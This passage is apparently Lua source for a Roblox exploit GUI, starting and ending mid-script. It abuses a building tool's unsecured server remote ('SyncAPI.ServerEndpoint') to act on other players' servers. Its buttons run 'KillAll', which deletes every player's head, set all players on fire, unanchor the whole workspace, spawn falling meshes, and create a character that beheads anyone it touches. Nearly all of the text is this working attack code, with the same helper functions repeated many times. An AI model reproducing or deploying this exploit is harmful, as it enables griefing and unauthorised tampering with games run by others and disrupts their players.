		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = workspace.Part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function AddFire(part)

			local args = {

				[1] = "CreateDecorations",

				[2] = {

					[1] = {

						["Part"] = part,

						["DecorationType"] = "Fire"

					}

				}

			}

			_(args)

		end

	

		function Fire(player)

			for i,v in player.Character:GetDescendants() do

				if v:IsA("BasePart") then

					AddFire(v)

				end

			end

			DestroyPart(player.Character.Head)

		end

	

		for i,v in game.Players:GetPlayers() do

			spawn(function()

				pcall(function()

					Fire(v)

				end)

			end)

		end

	end)

end

coroutine.wrap(YTBL_fake_script)()

local function YNEKD_fake_script() -- Luigirain.LocalScript 

	local script = Instance.new('LocalScript', Luigirain)



	script.Parent.MouseButton1Click:Connect(function()

		--rgrg

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = workspace

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = workspace.Part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = workspace.Part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		hrpcf = player.Character.HumanoidRootPart.CFrame

		while wait(0.5) do

			x = hrpcf.x

			z = hrpcf.z

			randint = math.random(-600,600)

			randint2 = math.random(-600,600)

			xloc = randint + x

			zloc = randint2 + z

			cf = player.Character.HumanoidRootPart.CFrame.y + 400

			spawn(function()

				CreatePart(CFrame.new(math.floor(xloc), math.random(cf,cf+400), math.floor(zloc)))

				for i,v in game.Workspace:GetDescendants() do

					if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then

						SetName(v,"b_1337")

						SetAnchor(false,v)

						AddMesh(v)

						Resize(v, Vector3.new(100,100,100),v.CFrame)

						MeshResize(v,Vector3.new(20,20,20))

						SetMesh(v,"1618237875")

						SetTexture(v, "1618237897")

						SetCollision(v,false)

					else

					end

				end

			end)

		end

	end)

end

coroutine.wrap(YNEKD_fake_script)()

local function DSRN_fake_script() -- RainToad.LocalScript 

	local script = Instance.new('LocalScript', RainToad)



	script.Parent.MouseButton1Click:Connect(function()

		--rgrg

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = workspace

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = workspace.Part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = workspace.Part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		hrpcf = player.Character.HumanoidRootPart.CFrame

		while wait(0.5) do

			x = hrpcf.x

			z = hrpcf.z

			randint = math.random(-600,600)

			randint2 = math.random(-600,600)

			xloc = randint + x

			zloc = randint2 + z

			cf = player.Character.HumanoidRootPart.CFrame.y + 400

			spawn(function()

				CreatePart(CFrame.new(math.floor(xloc), math.random(cf,cf+400), math.floor(zloc)))

				for i,v in game.Workspace:GetDescendants() do

					if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then

						SetName(v,"b_1337")

						SetAnchor(false,v)

						AddMesh(v)

						Resize(v, Vector3.new(100,100,100),v.CFrame)

						MeshResize(v,Vector3.new(3,3,3))

						SetMesh(v,"614605299")

						SetTexture(v, "614605300")

						SetCollision(v,false)

					else

					end

				end	

			end)

		end

	end)

end

coroutine.wrap(DSRN_fake_script)()

local function ELTQHS_fake_script() -- ThomasEngine.LocalScript 

	local script = Instance.new('LocalScript', ThomasEngine)



	script.Parent.MouseButton1Click:Connect(function()--rgrg

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = workspace.Part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Thomas(player)

			SetAnchor(true,char.HumanoidRootPart)

			CreatePart(char.HumanoidRootPart.CFrame,char)

			SetCollision(char.Part,false)

			SetLocked(char.Part,false)

			CreateSpotlight(char.Part)

			SyncLighting(char.Part,100)

			SetLocked(char.HumanoidRootPart,false)

			Weld(char.Part,char.HumanoidRootPart,char.Part)

			SetAnchor(false,char.Part)

			AddMesh(char.Part)

			MeshResize(char.Part,Vector3.new(3,3,3))

			SetMesh(char.Part,"4340968808")

			SetTexture(char.Part,"4340968918")

			SetAnchor(false,char.HumanoidRootPart)

			char.Humanoid.WalkSpeed = 100

			char.HumanoidRootPart.Touched:connect(function(obj)

				if obj.Parent:FindFirstChild("Humanoid") then

					SetLocked(obj.Parent.Head,false)

					DestroyPart(obj.Parent.Head)

				end

			end)

			game:GetService("RunService").RenderStepped:Connect(function()

				for i,v in char:GetDescendants() do

					if v:IsA("BasePart") then

						char.Humanoid.WalkSpeed = 100

						v.CanCollide = false

					end

				end

			end)

		end

		Thomas(player)

	end)

end

coroutine.wrap(ELTQHS_fake_script)()

local function QAIUFJB_fake_script() -- Unanchor.LocalScript 

	local script = Instance.new('LocalScript', Unanchor)



	script.Parent.MouseButton1Click:Connect(function()

	local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

	

	function Unanchor()

		for i,v in game.Workspace:GetDescendants() do

			spawn(function()

				SetLocked(v,false)

				SetAnchor(false,v)

			end)

		end

	end

	Unanchor()

	end)

end

coroutine.wrap(QAIUFJB_fake_script)()

local function ZLFWJ_fake_script() -- ScrollingFrame.LocalScript 

	local script = Instance.new('LocalScript', ScrollingFrame)



	for i,v in script.Parent:GetChildren() do

		pcall(function()

			v.Text = v.Name

		end)

	end

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent,types)

			local args = {

				[1] = "CreatePart",

				[2] = types,

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = workspace.Part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

	

		function Material(part,mate)

	

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Material"] = mate

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

	end

	while wait(5) do

		pcall(function()

			for i,v in game.Players.LocalPlayer.Character:GetDescendants() do

				if v:IsA("BasePart") then

					SetLocked(v,true)

				end

			end

		end)

	end

end

coroutine.wrap(ZLFWJ_fake_script)()

local function WPCCWW_fake_script() -- BasePlate.LocalScript 

	local script = Instance.new('LocalScript', BasePlate)



	script.Parent.MouseButton1Click:Connect(function()

	local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

		end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent,types)

		local args = {

			[1] = "CreatePart",

			[2] = types,

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

		end

		

		function Material(part,mate)

	

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Material"] = mate

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		hrpx = math.floor(char.HumanoidRootPart.CFrame.x)

		hrpz = math.floor(char.HumanoidRootPart.CFrame.z)

		hrpy = math.floor(char.HumanoidRootPart.CFrame.y)

	function SpawnBasePlate()

			CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")

			for i,v in game.Workspace:GetChildren() do

				if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then

					spawn(function()

						Resize(v,Vector3.new(1000,2,1000),CFrame.new(hrpx,hrpy-20,hrpz))

						Material(v,Enum.Material.Grass)

						Color(v,Color3.fromRGB(25,100,25))

						while wait(1) do

							pcall(function()SetLocked(v,true)end)

						end

					end)

				end

			end

	end

	SpawnBasePlate()

	end)

end

coroutine.wrap(WPCCWW_fake_script)()

local function UMGSN_fake_script() -- KillAll.LocalScript 

	local script = Instance.new('LocalScript', KillAll)



	script.Parent.MouseButton1Click:Connect(function()

	local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

	

	function KillAll()

		for i,v in game.Players:GetPlayers() do

			spawn(function()

				SetLocked(v.Character.Head,false)

				DestroyPart(v.Character.Head)

			end)

		end

	end

	KillAll()

	end)

end

coroutine.wrap(UMGSN_fake_script)()

local function KEYDXW_fake_script() -- Personalityall.LocalScript 

	local script = Instance.new('LocalScript', Personalityall)



	script.Parent.MouseButton1Click:Connect(function()

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

